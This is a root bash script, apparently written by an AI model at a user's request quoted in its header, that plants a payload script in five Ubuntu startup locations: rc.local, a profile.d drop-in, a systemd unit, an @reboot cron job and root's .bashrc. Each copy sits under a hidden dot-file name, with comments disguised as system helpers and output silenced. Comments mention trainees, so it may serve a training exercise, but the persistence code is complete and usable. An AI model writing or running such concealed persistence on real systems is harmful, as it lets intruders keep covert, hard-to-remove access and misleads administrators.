#!/usr/bin/env bash
# =============================================================================
# Claude Sonnet 4.6 High
# "Now I will go back to Linux. for ubuntu (most modern version) I want a script 
# that puts my "inject evil service" bash script we created earlier into a ton 
# of different startup locations to maximize the chances of it executing and 
# running every time the device reboots. think of 5 different locations where 
# we can execute this script at startup and create me a bash script I can run 
# on the device to plant that bash script in those locations once. also make 
# a separate txt short document as a guide to give them to read and find the spots."


# THIS SCRIPT IS TO DEPLOY A BEACON FILE IN 5 DIFFERENT SPOTS ON THE SERVER
# UNTESTED


set -euo pipefail

# ── Colour helpers ────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*" >&2; }

# ── Privilege check ───────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    err "Must be run as root (sudo $0)."
    exit 1
fi

# ── Path to the payload ───────────────────────────────────────────────────────
if [[ -n "${1:-}" ]]; then
    PAYLOAD_SRC="$1"
else
    while true; do
        printf "[?] Path to payload script: "
        read -r PAYLOAD_SRC || true
        PAYLOAD_SRC="${PAYLOAD_SRC//[[:space:]]/}"
        [[ -n "$PAYLOAD_SRC" ]] && break
        err "Path cannot be empty."
    done
fi

if [[ ! -f "${PAYLOAD_SRC}" ]]; then
    err "Payload not found: ${PAYLOAD_SRC}"
    err "Usage: sudo $0 /path/to/inject_evil_service.sh"
    exit 1
fi

# Make sure it is executable before we copy it anywhere
chmod +x "${PAYLOAD_SRC}"
info "Payload confirmed: ${PAYLOAD_SRC}"
echo

# =============================================================================
# LOCATION 1 — /etc/rc.local
# Classic SysV-era startup script. Runs as root after all init scripts finish.
# Ubuntu 22.04/24.04 supports it via the rc-local.service compatibility shim.
# =============================================================================
info "[1/5] Planting in /etc/rc.local ..."

RC_LOCAL="/etc/rc.local"
PAYLOAD_CALL="bash /usr/local/lib/.sysinit-helper 2>/dev/null &"

# Write a convincingly disguised rc.local
cat > "${RC_LOCAL}" <<RCEOF
#!/bin/bash
# rc.local — executed at the end of each multiuser runlevel.
# See the man page for rc.local(8) for details.

# System initialisation helper (do not remove)
${PAYLOAD_CALL}

exit 0
RCEOF
chmod +x "${RC_LOCAL}"

# Copy payload to a hidden-looking path referenced above
cp "${PAYLOAD_SRC}" /usr/local/lib/.sysinit-helper
chmod +x /usr/local/lib/.sysinit-helper

# Enable the rc-local systemd shim so rc.local actually runs on modern Ubuntu
systemctl enable rc-local 2>/dev/null || true
systemctl start  rc-local 2>/dev/null || true

success "  /etc/rc.local              — payload call injected"
success "  /usr/local/lib/.sysinit-helper — payload copy planted (hidden with dot prefix)"
echo

# =============================================================================
# LOCATION 2 — /etc/profile.d/ drop-in
# Every script in this directory is sourced for ALL interactive login shells.
# Runs as whichever user logs in (root session = root payload execution).
# =============================================================================
info "[2/5] Planting in /etc/profile.d/ ..."

PROFILED_SCRIPT="/etc/profile.d/99-sysenv-init.sh"
cp "${PAYLOAD_SRC}" /usr/local/lib/.sysenv-init
chmod +x /usr/local/lib/.sysenv-init

cat > "${PROFILED_SCRIPT}" <<'PROFEOF'
#!/bin/bash
# System environment initialisation — managed by sysenv-daemon
if [ "$(id -u)" -eq 0 ]; then
    bash /usr/local/lib/.sysenv-init 2>/dev/null &
fi
PROFEOF
chmod 644 "${PROFILED_SCRIPT}"

success "  /etc/profile.d/99-sysenv-init.sh — drop-in planted"
success "  /usr/local/lib/.sysenv-init       — payload copy planted"
echo

# =============================================================================
# LOCATION 3 — systemd system-wide service unit (second, independent unit)
# A *separate* systemd unit from sillyevilservice itself — this one re-runs
# the injector script at boot so even if trainees remove sillyevilservice,
# it gets re-deployed on the next reboot. Disguised as a kernel helper.
# =============================================================================
info "[3/5] Planting as a systemd oneshot unit ..."

UNIT_FILE="/etc/systemd/system/sys-khelper-init.service"
cp "${PAYLOAD_SRC}" /usr/local/lib/.khelper-init
chmod +x /usr/local/lib/.khelper-init

cat > "${UNIT_FILE}" <<UNITEOF
[Unit]
Description=Kernel subsystem helper initialisation
DefaultDependencies=no
After=local-fs.target network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash /usr/local/lib/.khelper-init
RemainAfterExit=yes
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
UNITEOF
chmod 644 "${UNIT_FILE}"

systemctl daemon-reload
systemctl enable sys-khelper-init.service 2>/dev/null || true

success "  /etc/systemd/system/sys-khelper-init.service — unit planted & enabled"
success "  /usr/local/lib/.khelper-init                  — payload copy planted"
echo

# =============================================================================
# LOCATION 4 — /etc/cron.d/ reboot entry
# @reboot cron jobs run once as root at system startup via the cron daemon.
# Separate from the evil cron task exercise — this one targets reboot only.
# =============================================================================
info "[4/5] Planting in /etc/cron.d/ as @reboot job ..."

CROND_FILE="/etc/cron.d/syslogd-helper"
cp "${PAYLOAD_SRC}" /usr/local/lib/.syslogd-helper
chmod +x /usr/local/lib/.syslogd-helper

cat > "${CROND_FILE}" <<'CRONEOF'
# syslog daemon helper task — do not remove (system managed)
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot  root  /bin/bash /usr/local/lib/.syslogd-helper 2>/dev/null
CRONEOF
chmod 644 "${CROND_FILE}"

success "  /etc/cron.d/syslogd-helper        — @reboot cron job planted"
success "  /usr/local/lib/.syslogd-helper     — payload copy planted"
echo

# =============================================================================
# LOCATION 5 — /root/.bashrc append
# Root's interactive shell config. Runs every time an interactive root bash
# session starts. Not reboot-only, but fires on every SSH/console login too —
# and on many systems root's first login happens right after boot.
# Guard prevents recursive loops and duplicate runs.
# =============================================================================
info "[5/5] Planting in /root/.bashrc ..."

BASHRC="/root/.bashrc"
MARKER="# __sysnet_diag_hook__"
cp "${PAYLOAD_SRC}" /usr/local/lib/.sysnet-diag
chmod +x /usr/local/lib/.sysnet-diag

# Only append if marker not already present (idempotent)
if ! grep -q "${MARKER}" "${BASHRC}" 2>/dev/null; then
    cat >> "${BASHRC}" <<BASHRCEOF

${MARKER}
# Network diagnostics daemon hook (system managed — do not remove)
if [[ \$EUID -eq 0 ]] && [[ -z "\${__SYSNET_DIAG_RAN:-}" ]]; then
    export __SYSNET_DIAG_RAN=1
    bash /usr/local/lib/.sysnet-diag 2>/dev/null &
fi
BASHRCEOF
fi

success "  /root/.bashrc              — hook appended"
success "  /usr/local/lib/.sysnet-diag — payload copy planted"
echo
